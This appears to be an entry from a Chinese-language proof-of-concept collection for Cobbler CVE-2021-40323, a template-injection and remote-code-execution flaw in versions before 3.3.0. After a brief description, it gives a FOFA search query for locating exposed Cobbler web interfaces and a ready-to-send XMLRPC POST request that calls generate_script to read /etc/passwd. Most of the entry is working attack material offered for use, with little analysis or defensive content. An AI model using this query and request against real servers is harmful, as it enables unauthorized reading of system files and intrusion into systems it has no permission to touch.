## Cobbler存在远程命令执行漏洞(CVE-2021-40323)

Cobbler是一款专注于自动化Linux系统安装和配置管理的工具，可帮助管理员快速部署服务器并确保配置一致性，支持多种操作系统和提供多项功能强大的特性，如Kickstart配置、PXE引导、DHCP管理等，提升系统管理效率和可靠性。

该产品在3.3.0之前版本存在远程代码执行漏洞，该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未能正确过滤其中的特殊元素，攻击者可利用该漏洞通过特制的XMLRPC方法记录日志文件以进行模板注入，从而导致日志中毒和远程代码执行。

## fofa
```
"Cobbler Web Interface"
```


## poc
```
POST /cobbler_api HTTP/1.1
Host: xxx
Content-Length: 0
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

<?xml version='1.0'?>
        <methodCall>
          <methodName>generate_script</methodName>
          <params>
            <param>
              <value>
                <string>centos6-x86_64</string>
              </value>
            </param>
            <param>
              <value>
                <string></string>
              </value>
            </param>
            <param>
              <value>
                <string>/etc/passwd</string>
              </value>
            </param>
          </params>
        </methodCall>
```

![image](https://github.com/wy876/POC/assets/139549762/bbe19773-779d-4591-b957-28cfc9bf8bce)
